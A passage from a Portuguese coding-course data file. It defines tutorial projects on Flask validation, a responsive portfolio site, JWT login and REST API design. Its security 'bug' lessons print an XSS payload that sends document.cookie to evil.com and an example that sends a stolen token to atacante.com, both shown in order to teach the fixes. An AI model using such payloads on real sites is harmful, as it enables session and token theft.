        return jsonify({"erro": "titulo obrigatorio"}), 400

# Atualizacao: NAO valida titulo
# Usuario pode atualizar com titulo="" ou titulo=None
def atualizar_nota(nota_id):
    db.execute("UPDATE notas SET titulo=? ...", (data.get("titulo"), ...))
    # titulo pode virar string vazia no banco`,
        },
        bugDescription:
          'Regras de validacao espalhadas pelo codigo ficam inconsistentes. Algumas rotas validam, outras nao.',
        bugLesson:
          'Centralize validacao. Uma funcao `validar_nota(data)` usada em todos os endpoints garante consistencia e facilita mudancas futuras.',
        fixedCode: {
          filename: 'validacao_centralizada.py',
          language: 'python',
          code: `def validar_nota(data: dict, obrigatorio: bool = True) -> tuple[dict, str | None]:
    """Retorna (dados_limpos, mensagem_erro) — erro e None se valido."""
    titulo = (data.get("titulo") or "").strip()
    conteudo = (data.get("conteudo") or "").strip()

    if obrigatorio and not titulo:
        return {}, "titulo obrigatorio"
    if len(titulo) > 200:
        return {}, "titulo muito longo (max 200 chars)"

    return {"titulo": titulo, "conteudo": conteudo}, None


# Uso em qualquer rota:
dados, erro = validar_nota(request.json or {})
if erro:
    return jsonify({"erro": erro}), 400`,
        },
        checkpoint: 'Validacao centralizada reutilizada em criacao e atualizacao.',
      },
      {
        id: 'auth-crud-5',
        order: 5,
        type: 'architecture',
        title: 'Arquitetura Final de Producao',
        context:
          'Este projeto reune autenticacao, banco relacional, validacao e arquitetura em camadas — o padrao de sistemas reais.',
        objective: 'Revisar a estrutura completa e os fluxos de seguranca.',
        concepts: ['arquitetura de producao', 'fluxo de autenticacao', 'camadas', 'checklist de seguranca'],
        code: {
          filename: 'estrutura_final.txt',
          language: 'bash',
          code: `crud-com-auth/
  app.py                 # factory Flask + registro de blueprints
  config.py              # variaveis de ambiente (SECRET_KEY, DB_PATH)
  database.py            # conexao, schema, helpers
  auth/
    routes.py            # POST /registro, POST /login
    service.py           # registrar(), autenticar()
    token.py             # gerar_token(), validar_token()
    middleware.py        # @requer_login decorator
  notas/
    routes.py            # CRUD de /notas e /notas/<id>
    service.py           # validar_nota(), regras de negocio
    repository.py        # queries SQL (sempre com usuario_id)

Checklist de seguranca:
  [x] Senhas com bcrypt
  [x] JWT com expiracao
  [x] Ownership check em toda query
  [x] Validacao de entrada em todos os endpoints
  [x] SQL parametrizado (sem concatenacao)
  [x] Erros HTTP semanticos (400/401/403/404/500)`,
        },
        checkpoint: 'Sistema completo: registro, login, CRUD protegido e arquitetura em camadas.',
      },
    ],
  },

  // ─────────────────────────────────────────────────────────────────────────────
  // Project 9: Site Completo
  // ─────────────────────────────────────────────────────────────────────────────
  {
    id: 'site-completo',
    title: 'Criando um Site Completo',
    subtitle: 'Do HTML puro ao site responsivo publicado na internet',
    description:
      'Construa um portfolio pessoal completo partindo do HTML semantico, passando por CSS responsivo com Flexbox e Grid, JavaScript para interatividade, ate o deploy gratuito na Vercel.',
    difficulty: 'basico',
    totalTime: '~5h',
    techStack: ['HTML', 'CSS', 'JavaScript', 'Vercel'],
    whatYoullLearn: [
      'estrutura HTML semantica',
      'CSS Flexbox/Grid',
      'responsividade',
      'JavaScript DOM',
      'formulario funcional',
      'deploy',
    ],
    steps: [
      {
        id: 'site-completo-1',
        order: 1,
        type: 'code',
        title: 'Estrutura HTML Semantica',
        context:
          'A maioria dos iniciantes usa apenas divs para tudo. HTML semantico usa tags com significado real: header, nav, main, section, article, footer. Isso melhora acessibilidade, SEO e legibilidade do codigo.',
        objective:
          'Construir a estrutura de um portfolio pessoal usando tags semanticas do HTML5.',
        concepts: ['HTML semantico', 'tags estruturais', 'acessibilidade', 'SEO basico'],
        code: {
          filename: 'index.html',
          language: 'html',
          code: `<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Portfolio - Ana Silva</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <header>
    <nav>
      <a href="#sobre">Sobre</a>
      <a href="#projetos">Projetos</a>
      <a href="#contato">Contato</a>
    </nav>
  </header>

  <main>
    <section id="sobre">
      <h1>Ana Silva</h1>
      <p>Desenvolvedora web apaixonada por criar experiencias digitais.</p>
    </section>

    <section id="projetos">
      <h2>Projetos</h2>
      <article class="card">
        <h3>Calculadora</h3>
        <p>Calculadora em JavaScript puro.</p>
        <a href="#">Ver projeto</a>
      </article>
    </section>

    <section id="contato">
      <h2>Contato</h2>
      <form id="form-contato">
        <input type="text" name="nome" placeholder="Seu nome" required>
        <input type="email" name="email" placeholder="Seu email" required>
        <textarea name="mensagem" placeholder="Mensagem" required></textarea>
        <button type="submit">Enviar</button>
      </form>
    </section>
  </main>

  <footer>
    <p>Feito com HTML, CSS e JavaScript</p>
  </footer>

  <script src="main.js"></script>
</body>
</html>`,
        },
        checkpoint: 'Pagina tem estrutura semantica correta.',
      },
      {
        id: 'site-completo-2',
        order: 2,
        type: 'bug',
        title: 'CSS que Quebra no Mobile',
        context:
          'Um erro classico de iniciantes: definir larguras fixas em pixels. No desktop parece otimo, mas no celular a pagina "estoura" horizontalmente e aparece uma barra de rolagem horizontal feia.',
        objective:
          'Identificar e corrigir o CSS que quebra o layout em telas menores que 1200px.',
        concepts: ['unidades relativas', 'max-width', 'viewport', 'mobile-first'],
        bugCode: {
          filename: 'style.css',
          language: 'css',
          code: `/* PROBLEMA: largura fixa em pixels */
.container {
  width: 1200px;    /* quebra em celulares! */
  margin: 0 auto;
  padding: 20px;
}

.card {
  width: 380px;     /* nao se adapta */
  display: inline-block;
}`,
        },
        bugDescription:
          'No celular, a pagina estoura a tela horizontalmente. Uma barra de rolagem horizontal aparece e o conteudo fica cortado.',
        bugLesson:
          'Use unidades relativas (%, vw, max-width) e Flexbox/Grid em vez de larguras fixas. max-width permite crescer ate um limite sem quebrar em telas menores.',
        fixedCode: {
          filename: 'style.css',
          language: 'css',
          code: `/* CORRIGIDO: largura fluida com maximo */
.container {
  max-width: 1200px;   /* nao passa de 1200px */
  width: 100%;         /* ocupa o espaco disponivel */
  margin: 0 auto;
  padding: 0 16px;     /* espaco lateral no mobile */
  box-sizing: border-box;
}

.card {
  width: 100%;         /* fluido dentro do grid */
}`,
        },
        checkpoint: 'Layout funciona em tela de 375px e 1440px.',
      },
      {
        id: 'site-completo-3',
        order: 3,
        type: 'refactor',
        title: 'Estilizando com Flexbox e Grid',
        context:
          'Com a estrutura HTML pronta e o layout responsivo, agora e hora de adicionar o CSS que organiza os cards de projetos em um grid que se adapta automaticamente e o navbar com Flexbox.',
        objective:
          'Implementar CSS Grid para os cards de projetos e Flexbox para a navbar.',
        concepts: ['CSS Grid', 'Flexbox', 'repeat auto-fit', 'minmax', 'gap'],
        code: {
          filename: 'style.css',
          language: 'css',
          code: `/* Variaveis CSS */
:root {
  --cor-primaria: #6366f1;
  --cor-fundo: #0f172a;
  --cor-texto: #e2e8f0;
  --raio: 8px;
}

/* Navbar com Flexbox */
nav {
  display: flex;
  justify-content: center;
  gap: 2rem;
  padding: 1rem;
  background: var(--cor-fundo);
}

nav a {
  color: var(--cor-texto);
  text-decoration: none;
  font-weight: 500;
  transition: color 0.2s;
}

nav a:hover {
  color: var(--cor-primaria);
}

/* Grid de projetos que se auto-organiza */
#projetos {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
  gap: 1.5rem;
  padding: 2rem 1rem;
}

.card {
  background: #1e293b;
  border-radius: var(--raio);
  padding: 1.5rem;
  border: 1px solid #334155;
}`,
        },
        checkpoint: 'Cards se reorganizam automaticamente conforme a largura da tela.',
      },
      {
        id: 'site-completo-4',
        order: 4,
        type: 'integration',
        title: 'Formulario de Contato com JavaScript',
        context:
          'Formularios sem validacao sao problematicos: o servidor recebe dados invalidos, o usuario nao sabe o que errou. JavaScript no frontend valida antes de enviar.',
        objective:
          'Adicionar validacao de formulario com JavaScript, mensagens de erro e simulacao de envio.',
        concepts: ['DOM manipulation', 'validacao de formulario', 'regex de email', 'fetch API', 'UX de formulario'],
        code: {
          filename: 'main.js',
          language: 'javascript',
          code: `const form = document.getElementById('form-contato');
const btnEnviar = form.querySelector('button[type="submit"]');

function mostrarErro(campo, mensagem) {
  const erro = document.getElementById('erro-' + campo.name) ||
    (() => {
      const el = document.createElement('span');
      el.id = 'erro-' + campo.name;
      el.style.color = '#f87171';
      el.style.fontSize = '0.85rem';
      campo.insertAdjacentElement('afterend', el);
      return el;
    })();
  erro.textContent = mensagem;
}

function limparErro(campo) {
  const erro = document.getElementById('erro-' + campo.name);
  if (erro) erro.textContent = '';
}

function validarEmail(email) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

form.addEventListener('submit', async (e) => {
  e.preventDefault();
  let valido = true;

  const nome = form.elements['nome'];
  const email = form.elements['email'];
  const mensagem = form.elements['mensagem'];

  if (nome.value.trim().length < 2) {
    mostrarErro(nome, 'Nome deve ter pelo menos 2 caracteres.');
    valido = false;
  } else {
    limparErro(nome);
  }

  if (!validarEmail(email.value)) {
    mostrarErro(email, 'Digite um email valido.');
    valido = false;
  } else {
    limparErro(email);
  }

  if (mensagem.value.trim().length < 10) {
    mostrarErro(mensagem, 'Mensagem deve ter pelo menos 10 caracteres.');
    valido = false;
  } else {
    limparErro(mensagem);
  }

  if (!valido) return;

  btnEnviar.disabled = true;
  btnEnviar.textContent = 'Enviando...';

  try {
    // Simulacao de envio (substituir por endpoint real)
    await new Promise((resolve) => setTimeout(resolve, 1500));
    form.reset();
    alert('Mensagem enviada com sucesso!');
  } catch (err) {
    alert('Erro ao enviar. Tente novamente.');
  } finally {
    btnEnviar.disabled = false;
    btnEnviar.textContent = 'Enviar';
  }
});`,
        },
        checkpoint: 'Formulario valida campos e mostra feedback ao usuario.',
      },
      {
        id: 'site-completo-5',
        order: 5,
        type: 'bug',
        title: 'XSS: Entrada do Usuario no HTML',
        context:
          'Cross-Site Scripting (XSS) e uma das vulnerabilidades web mais comuns. Acontece quando codigo JavaScript malicioso e injetado na pagina atraves de input do usuario.',
        objective:
          'Identificar e corrigir uma vulnerabilidade XSS causada pelo uso de innerHTML com dados do usuario.',
        concepts: ['XSS', 'innerHTML vs textContent', 'seguranca web', 'sanitizacao de entrada'],
        bugCode: {
          filename: 'main.js',
          language: 'javascript',
          code: `// VULNERAVEL: insere HTML direto do usuario
function exibirMensagem(userInput) {
  const div = document.getElementById('resultado');
  div.innerHTML = userInput;  // PERIGO: executa scripts!
}

// Se userInput for: <img src=x onerror="alert('hackeado')">
// O script executa imediatamente ao ser inserido no DOM`,
        },
        bugDescription:
          "Se o usuario digitar <script>alert('hackeado')</script> ou <img src=x onerror=\"fetch('https://evil.com?c='+document.cookie)\">, o script executa no contexto da pagina.",
        bugLesson:
          'Nunca use innerHTML com dados do usuario. Use textContent para texto puro, ou crie elementos com createElement e defina propriedades individuais. Se precisar renderizar HTML, use uma biblioteca de sanitizacao.',
        fixedCode: {
          filename: 'main.js',
          language: 'javascript',
          code: `// SEGURO: textContent nunca executa scripts
function exibirMensagem(userInput) {
  const div = document.getElementById('resultado');
  div.textContent = userInput;  // exibe como texto literal
}

// Alternativa para criar elementos dinamicamente:
function criarCard(titulo, descricao) {
  const card = document.createElement('div');
  card.className = 'card';

  const h3 = document.createElement('h3');
  h3.textContent = titulo;     // seguro

  const p = document.createElement('p');
  p.textContent = descricao;   // seguro

  card.appendChild(h3);
  card.appendChild(p);
  return card;
}`,
        },
        checkpoint: 'Nenhum input do usuario e inserido diretamente como HTML.',
      },
      {
        id: 'site-completo-6',
        order: 6,
        type: 'architecture',
        title: 'Deploy no Vercel em 5 Minutos',
        context:
          'Com o site pronto, e hora de publica-lo. A Vercel oferece hospedagem gratuita para projetos estaticos com HTTPS automatico, CDN global e deploys automaticos a cada push no GitHub.',
        objective:
          'Entender a estrutura do projeto e realizar o deploy na Vercel conectando ao GitHub.',
        concepts: ['deploy', 'Vercel', 'GitHub', 'hospedagem estatica', 'CI/CD basico'],
        code: {
          filename: 'estrutura.txt',
          language: 'bash',
          code: `# Estrutura do projeto
portfolio/
  index.html
  style.css
  main.js
  assets/
    foto.jpg
    favicon.ico

# Passo 1: inicializar git
git init
git add .
git commit -m "primeiro commit: portfolio completo"

# Passo 2: criar repositorio no GitHub
# Acesse github.com > New repository > "portfolio"
# Copie o URL do repositorio

# Passo 3: subir para o GitHub
git remote add origin https://github.com/seu-usuario/portfolio.git
git push -u origin main

# Passo 4: deploy na Vercel
# Acesse vercel.com > New Project
# Importe o repositorio do GitHub
# Clique em Deploy (configuracoes zero para sites estaticos)

# Resultado: https://portfolio-seu-usuario.vercel.app
# Deploy automatico a cada git push`,
        },
        checkpoint: 'Site publicado e acessivel por URL publica.',
      },
    ],
  },

  // ─────────────────────────────────────────────────────────────────────────────
  // Project 10: Sistema de Login Completo
  // ─────────────────────────────────────────────────────────────────────────────
  {
    id: 'sistema-login-completo',
    title: 'Sistema de Login do Zero ao Frontend',
    subtitle: 'Registro, login, token JWT, tela de login e rotas protegidas',
    description:
      'Implemente um sistema de autenticacao completo: backend Flask com bcrypt e JWT, frontend com formulario de login, armazenamento seguro do token e protecao de paginas privadas.',
    difficulty: 'avancado',
    totalTime: '~8h',
    techStack: ['Python', 'Flask', 'SQLite', 'JWT', 'HTML', 'JavaScript', 'fetch API'],
    whatYoullLearn: [
      'fluxo completo de autenticacao',
      'JWT no frontend',
      'localStorage vs cookies',
      'fetch com Authorization header',
      'rotas protegidas no frontend',
      'logout correto',
    ],
    steps: [
      {
        id: 'login-1',
        order: 1,
        type: 'code',
        title: 'Backend: Registro e Login',
        context:
          'A base de qualquer sistema de autenticacao: endpoints para criar conta e fazer login. Senhas NUNCA sao salvas em texto puro — usamos bcrypt para criar um hash seguro. O login retorna um JWT que o cliente usara em todas as requisicoes seguintes.',
        objective:
          'Criar os endpoints POST /registro e POST /login com hashing de senha e geracao de JWT.',
        concepts: ['bcrypt', 'JWT', 'hash de senha', 'Flask', 'SQLite', 'validacao de entrada'],
        code: {
          filename: 'auth.py',
          language: 'python',
          code: `from flask import Flask, request, jsonify
import sqlite3, bcrypt, jwt, datetime, os

app = Flask(__name__)
SECRET_KEY = os.environ.get('SECRET_KEY', 'chave-secreta-dev')

def get_db():
    db = sqlite3.connect('usuarios.db')
    db.row_factory = sqlite3.Row
    return db

def init_db():
    with get_db() as db:
        db.execute('''CREATE TABLE IF NOT EXISTS usuarios (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email TEXT UNIQUE NOT NULL,
            senha_hash TEXT NOT NULL
        )''')

@app.post('/registro')
def registro():
    dados = request.get_json() or {}
    email = dados.get('email', '').strip().lower()
    senha = dados.get('senha', '')
    if not email or not senha:
        return jsonify({'erro': 'Email e senha sao obrigatorios'}), 400
    if len(senha) < 8:
        return jsonify({'erro': 'Senha deve ter pelo menos 8 caracteres'}), 400
    hash_senha = bcrypt.hashpw(senha.encode(), bcrypt.gensalt()).decode()
    try:
        with get_db() as db:
            db.execute('INSERT INTO usuarios (email, senha_hash) VALUES (?, ?)',
                       (email, hash_senha))
        return jsonify({'mensagem': 'Conta criada com sucesso'}), 201
    except sqlite3.IntegrityError:
        return jsonify({'erro': 'Email ja cadastrado'}), 409

@app.post('/login')
def login():
    dados = request.get_json() or {}
    email = dados.get('email', '').strip().lower()
    senha = dados.get('senha', '')
    with get_db() as db:
        row = db.execute('SELECT * FROM usuarios WHERE email = ?', (email,)).fetchone()
    if not row or not bcrypt.checkpw(senha.encode(), row['senha_hash'].encode()):
        return jsonify({'erro': 'Email ou senha incorretos'}), 401
    token = jwt.encode({
        'sub': row['id'],
        'email': email,
        'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=1)
    }, SECRET_KEY, algorithm='HS256')
    return jsonify({'token': token})

if __name__ == '__main__':
    init_db()
    app.run(debug=True)`,
        },
        checkpoint: 'POST /login retorna token JWT valido.',
      },
      {
        id: 'login-2',
        order: 2,
        type: 'integration',
        title: 'Frontend: Formulario de Login',
        context:
          'Com o backend pronto, o frontend precisa coletar email e senha, chamar POST /login via fetch e lidar com os dois cenarios: sucesso (guardar token e redirecionar) e falha (mostrar mensagem de erro).',
        objective:
          'Criar o JavaScript que faz login, armazena o token e redireciona para o dashboard.',
        concepts: ['fetch API', 'async/await', 'localStorage', 'tratamento de erro HTTP', 'redirect'],
        code: {
          filename: 'login.js',
          language: 'javascript',
          code: `const form = document.getElementById('form-login');
const msgErro = document.getElementById('msg-erro');

form.addEventListener('submit', async (e) => {
  e.preventDefault();
  msgErro.textContent = '';

  const email = form.elements['email'].value.trim();
  const senha = form.elements['senha'].value;
  const btnLogin = form.querySelector('button[type="submit"]');

  btnLogin.disabled = true;
  btnLogin.textContent = 'Entrando...';

  try {
    const resposta = await fetch('/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, senha }),
    });

    const dados = await resposta.json();

    if (!resposta.ok) {
      // 401: credenciais erradas, 400: dados invalidos
      msgErro.textContent = dados.erro || 'Erro ao fazer login.';
      return;
    }

    // Guarda o token e redireciona
    localStorage.setItem('token', dados.token);
    window.location.href = '/dashboard.html';
  } catch (err) {
    msgErro.textContent = 'Erro de conexao. Verifique sua internet.';
  } finally {
    btnLogin.disabled = false;
    btnLogin.textContent = 'Entrar';
  }
});`,
        },
        checkpoint: 'Login salva token e redireciona para dashboard.',
      },
      {
        id: 'login-3',
        order: 3,
        type: 'bug',
        title: 'Token Guardado no Lugar Errado',
        context:
          'Onde guardar o JWT e uma decisao de seguranca importante. localStorage e conveniente mas acessivel por qualquer JavaScript na pagina. httpOnly cookies sao inacessiveis para JavaScript — mais seguros contra XSS.',
        objective:
          'Entender os trade-offs entre localStorage e httpOnly cookies para armazenar tokens.',
        concepts: ['localStorage', 'httpOnly cookie', 'XSS', 'CSRF', 'seguranca de autenticacao'],
        bugCode: {
          filename: 'login.js',
          language: 'javascript',
          code: `// RISCO: localStorage e acessivel por qualquer script na pagina
localStorage.setItem('token', response.token);

// Se houver XSS, o atacante pode:
const tokenRoubado = localStorage.getItem('token');
fetch('https://atacante.com?t=' + tokenRoubado);`,
        },
        bugDescription:
          'Qualquer script na pagina pode acessar localStorage. Se houver uma vulnerabilidade XSS (mesmo em uma dependencia), o atacante roba o token e pode se passar pelo usuario.',
        bugLesson:
          'Para producao, use httpOnly cookies: o servidor define o cookie e JavaScript nunca consegue le-lo. Para projetos simples e internos, localStorage e aceitavel SE voce previne XSS corretamente (sem innerHTML com dados do usuario).',
        fixedCode: {
          filename: 'auth.py',
          language: 'python',
          code: `# PRODUCAO: retorna token em httpOnly cookie (inacessivel para JS)
from flask import make_response

@app.post('/login')
def login():
    # ... (validacao igual antes)
    token = jwt.encode({...}, SECRET_KEY, algorithm='HS256')

    resposta = make_response(jsonify({'mensagem': 'Login realizado'}))
    resposta.set_cookie(
        'token',
        token,
        httponly=True,    # JavaScript nao consegue ler
        secure=True,      # Apenas HTTPS
        samesite='Strict', # Protege contra CSRF
        max_age=3600
    )
    return resposta

# No frontend: fetch sem Authorization header,
# o browser envia o cookie automaticamente
# fetch('/dashboard-data', { credentials: 'include' })`,
        },
        checkpoint: 'Voce sabe os trade-offs de onde guardar o token.',
      },
      {
        id: 'login-4',
        order: 4,
        type: 'code',
        title: 'Protegendo Paginas no Frontend',
        context:
          'Sem protecao, qualquer pessoa pode acessar /dashboard.html diretamente. O JavaScript precisa verificar se ha token valido ao carregar a pagina e redirecionar para o login se nao houver.',
        objective:
          'Criar um guardiao de autenticacao que protege paginas privadas no frontend.',
        concepts: ['auth guard', 'JWT decode', 'redirect', 'Authorization header', 'interceptor'],
        code: {
          filename: 'auth-guard.js',
          language: 'javascript',
          code: `// Decodifica JWT sem verificar assinatura (apenas para UI)
function decodeJWT(token) {
  try {
    const payload = token.split('.')[1];
    return JSON.parse(atob(payload));
  } catch {
    return null;
  }
}

function estaAutenticado() {
  const token = localStorage.getItem('token');
  if (!token) return false;
  const payload = decodeJWT(token);
  if (!payload) return false;
  // Verifica se nao expirou (exp em segundos Unix)
  return payload.exp * 1000 > Date.now();
}

// Redireciona se nao autenticado
if (!estaAutenticado()) {
  window.location.href = '/login.html';
}

// Funcao auxiliar para fetch autenticado
async function fetchAutenticado(url, opcoes) {
  const token = localStorage.getItem('token');
  return fetch(url, {
    ...opcoes,
    headers: {
      ...opcoes?.headers,
      'Authorization': 'Bearer ' + token,
      'Content-Type': 'application/json',
    },
  });
}

// Uso: await fetchAutenticado('/api/notas')`,
        },
        checkpoint: 'Paginas protegidas redirecionam para login se nao autenticado.',
      },
      {
        id: 'login-5',
        order: 5,
        type: 'bug',
        title: 'Logout que Nao Desloga',
        context:
          'O logout so no frontend e uma falsa sensacao de seguranca. Remover o token do localStorage impede o usuario de usa-lo localmente, mas o token continua valido no servidor ate expirar.',
        objective:
          'Implementar logout real que invalida o token no servidor, nao apenas no cliente.',
        concepts: ['blacklist de tokens', 'Redis', 'logout seguro', 'refresh token', 'expiracao curta'],
        bugCode: {
          filename: 'logout.js',
          language: 'javascript',
          code: `// INCOMPLETO: remove do localStorage mas token ainda e valido
function logout() {
  localStorage.removeItem('token');
  window.location.href = '/login.html';
}
// Se alguem copiou o token antes, ainda funciona por 1 hora`,
        },
        bugDescription:
          'O token continua valido no servidor ate expirar (1 hora). Se o token foi roubado ou copiado antes do logout, o atacante ainda tem acesso por ate 1 hora.',
        bugLesson:
          'Logout real exige invalidar o token no servidor. Opcao 1: blacklist em memoria/Redis com os tokens revogados. Opcao 2: tokens com expiracao curta (15min) + refresh tokens. Para projetos simples, blacklist em memoria e suficiente.',
        fixedCode: {
          filename: 'auth.py',
          language: 'python',
          code: `# Blacklist simples em memoria (use Redis em producao)
token_blacklist = set()

@app.post('/logout')
def logout():
    auth = request.headers.get('Authorization', '')
    if auth.startswith('Bearer '):
        token = auth.split(' ', 1)[1]
        token_blacklist.add(token)  # invalida o token
    return jsonify({'mensagem': 'Logout realizado'}), 200

def validar_token(token):
    if token in token_blacklist:
        return None  # token invalidado
    try:
        return jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
    except jwt.InvalidTokenError:
        return None`,
        },
        checkpoint: 'Logout invalida o token no servidor, nao so no cliente.',
      },
      {
        id: 'login-6',
        order: 6,
        type: 'architecture',
        title: 'Fluxo Completo de Autenticacao',
        context:
          'Com todas as pecas implementadas, vamos visualizar o fluxo completo de autenticacao e a estrutura de arquivos do projeto. Entender o fluxo e fundamental para debugar problemas de autenticacao.',
        objective:
          'Compreender e documentar o fluxo completo de autenticacao do sistema.',
        concepts: ['fluxo de autenticacao', 'arquitetura', 'JWT lifecycle', 'seguranca em camadas'],
        code: {
          filename: 'fluxo.txt',
          language: 'bash',
          code: `# FLUXO DE AUTENTICACAO COMPLETO

# 1. REGISTRO
# Cliente: POST /registro {email, senha}
# Servidor: valida entrada -> bcrypt(senha) -> salva no DB
# Resposta: 201 Created

# 2. LOGIN
# Cliente: POST /login {email, senha}
# Servidor: busca usuario -> bcrypt.check(senha, hash) -> gera JWT
# JWT payload: {sub: user_id, email, exp: now+1h}
# Resposta: {token: "eyJhbG..."}

# 3. REQUISICAO AUTENTICADA
# Cliente: GET /api/notas + Header: Authorization: Bearer <token>
# Servidor: extrai token -> valida assinatura -> verifica exp
# Se valido: processa requisicao
# Se invalido: 401 Unauthorized

# 4. LOGOUT
# Cliente: POST /logout + Header: Authorization: Bearer <token>
# Servidor: adiciona token na blacklist
# Cliente: remove token do localStorage

# ESTRUTURA DE ARQUIVOS
backend/
  auth.py          # /registro, /login, /logout
  middleware.py    # decorator @requer_login
  database.py      # conexao SQLite

frontend/
  login.html       # formulario de login
  login.js         # logica de autenticacao
  auth-guard.js    # protege paginas privadas
  dashboard.html   # pagina protegida`,
        },
        checkpoint: 'Fluxo completo de autenticacao implementado e compreendido.',
      },
    ],
  },

  // ─────────────────────────────────────────────────────────────────────────────
  // Project 11: API REST Completa
  // ─────────────────────────────────────────────────────────────────────────────
  {
    id: 'api-rest-completa',
    title: 'Criando uma API REST Profissional',
    subtitle: 'Endpoints, documentacao, autenticacao e boas praticas',
    description:
      'Projete e implemente uma API REST seguindo as convencoes da industria: verbos HTTP corretos, status codes semanticos, paginacao, filtros, rate limiting e arquitetura organizada com blueprints.',
    difficulty: 'avancado',
    totalTime: '~7h',
    techStack: ['Python', 'Flask', 'SQLite', 'JWT', 'Swagger/OpenAPI'],
    whatYoullLearn: [
      'design de API REST',
      'versionamento',
      'paginacao',
      'filtros e busca',
      'documentacao automatica',
      'rate limiting',
      'boas praticas de resposta',
    ],
    steps: [
      {
        id: 'api-rest-1',
        order: 1,
        type: 'code',
        title: 'Design de Endpoints REST',
        context:
          'Uma API mal projetada e difícil de usar e manter. REST nao e apenas HTTP — e um conjunto de convencoes: recursos no plural, verbos HTTP para indicar acao, versionamento na URL, respostas previsíveis.',
        objective:
          'Projetar e implementar endpoints REST que seguem as convencoes da industria.',
        concepts: ['REST', 'verbos HTTP', 'recursos', 'versionamento de API', 'status codes'],
        code: {
          filename: 'rotas.py',
          language: 'python',
          code: `from flask import Flask, Blueprint, jsonify, request

app = Flask(__name__)
v1 = Blueprint('v1', __name__, url_prefix='/api/v1')

# RUIM (nao REST):
# GET  /getProdutos
# POST /criarProduto
# GET  /deletarProduto?id=1

# BOM (REST):
# GET    /api/v1/produtos          -> lista todos
# POST   /api/v1/produtos          -> cria novo
# GET    /api/v1/produtos/<id>     -> busca por id
# PUT    /api/v1/produtos/<id>     -> substitui completo
# PATCH  /api/v1/produtos/<id>     -> atualiza parcial
# DELETE /api/v1/produtos/<id>     -> remove

@v1.get('/produtos')
def listar_produtos():
    return jsonify({'data': [], 'meta': {'total': 0}}), 200

@v1.post('/produtos')
def criar_produto():
    dados = request.get_json() or {}
    if not dados.get('nome'):
        return jsonify({'erro': 'Campo nome e obrigatorio'}), 400
    # ... salva no banco
    return jsonify({'data': {'id': 1, **dados}}), 201

@v1.get('/produtos/<int:produto_id>')
def buscar_produto(produto_id):
    # ... busca no banco
    produto = None  # simulacao
    if not produto:
        return jsonify({'erro': 'Produto nao encontrado'}), 404
    return jsonify({'data': produto}), 200

@v1.delete('/produtos/<int:produto_id>')
def deletar_produto(produto_id):
    # ... deleta do banco
    return '', 204  # No Content

app.register_blueprint(v1)`,
        },
        checkpoint: 'API segue convencoes REST: recursos no plural, verbos HTTP corretos, versionamento.',
      },
      {
        id: 'api-rest-2',
        order: 2,
        type: 'bug',
        title: 'Retornando 200 Para Tudo',
        context:
          'Um erro comum de iniciantes: retornar status 200 (OK) para todas as respostas, mesmo erros. Isso quebra qualquer cliente que depende dos status codes para tratar respostas automaticamente.',
        objective:
          'Identificar e corrigir o uso incorreto de status codes HTTP na API.',
        concepts: ['HTTP status codes', '2xx sucesso', '4xx erro do cliente', '5xx erro do servidor', 'semantica HTTP'],
        bugCode: {
          filename: 'rotas.py',
          language: 'python',
          code: `@app.get('/produtos/<int:id>')
def buscar(id):
    produto = db.get(id)
    if not produto:
        # ERRADO: retorna 200 mas com mensagem de erro
        return jsonify({'error': 'not found'}), 200

@app.post('/produtos')
def criar():
    # ERRADO: criacao retorna 200 em vez de 201
    novo = db.insert(request.json)
    return jsonify(novo), 200`,
        },
        bugDescription:
          'O cliente nao sabe que algo deu errado. Status 200 significa sucesso. O frontend nao consegue tratar erros automaticamente — teria que ler o corpo da resposta e procurar a chave "error".',
        bugLesson:
          'Cada situacao tem um status correto: 200 OK, 201 Created (recurso criado), 204 No Content (sem corpo), 400 Bad Request (dados invalidos), 401 Unauthorized (nao autenticado), 403 Forbidden (sem permissao), 404 Not Found, 422 Unprocessable Entity, 429 Too Many Requests, 500 Server Error.',
        fixedCode: {
          filename: 'rotas.py',
          language: 'python',
          code: `@app.get('/produtos/<int:id>')
def buscar(id):
    produto = db.get(id)
    if not produto:
        return jsonify({'erro': 'Produto nao encontrado'}), 404
    return jsonify({'data': produto}), 200  # encontrado

@app.post('/produtos')
def criar():
    dados = request.get_json() or {}
    if not dados.get('nome'):
        return jsonify({'erro': 'nome e obrigatorio'}), 400
    if len(dados['nome']) > 200:
        return jsonify({'erro': 'nome muito longo'}), 422
    novo = db.insert(dados)
    return jsonify({'data': novo}), 201  # criado com sucesso

@app.delete('/produtos/<int:id>')
def deletar(id):
    if not db.delete(id):
        return jsonify({'erro': 'Produto nao encontrado'}), 404
    return '', 204  # deletado, sem corpo`,
        },
        checkpoint: 'Cada endpoint retorna o status HTTP semanticamente correto.',
      },
      {
        id: 'api-rest-3',
        order: 3,
        type: 'integration',
        title: 'Paginacao e Filtros',
        context:
          'Uma API que retorna todos os registros de uma vez nao escala. Com 1 milhao de produtos, retornar tudo mata o servidor e o cliente. Paginacao e filtros sao essenciais em qualquer API de producao.',
        objective:
          'Implementar paginacao com metadados e filtros por query string no endpoint de listagem.',
        concepts: ['paginacao', 'LIMIT/OFFSET', 'query params', 'metadados de paginacao', 'validacao de parametros'],
        code: {
          filename: 'paginacao.py',
          language: 'python',
          code: `import sqlite3
from flask import request, jsonify

def listar_produtos():
    # Valida e sanitiza query params
    try:
        page = max(1, int(request.args.get('page', 1)))
        limit = min(100, max(1, int(request.args.get('limit', 20))))
    except ValueError:
        return jsonify({'erro': 'page e limit devem ser numeros inteiros'}), 400

    categoria = request.args.get('categoria', '')
    preco_max = request.args.get('preco_max', '')

    offset = (page - 1) * limit

    # Constroi query com filtros opcionais (parametrizado)
    condicoes = []
    params = []

    if categoria:
        condicoes.append('categoria = ?')
        params.append(categoria)
    if preco_max:
        try:
            condicoes.append('preco <= ?')
            params.append(float(preco_max))
        except ValueError:
            return jsonify({'erro': 'preco_max invalido'}), 400

    where = ('WHERE ' + ' AND '.join(condicoes)) if condicoes else ''

    with sqlite3.connect('loja.db') as db:
        total = db.execute(
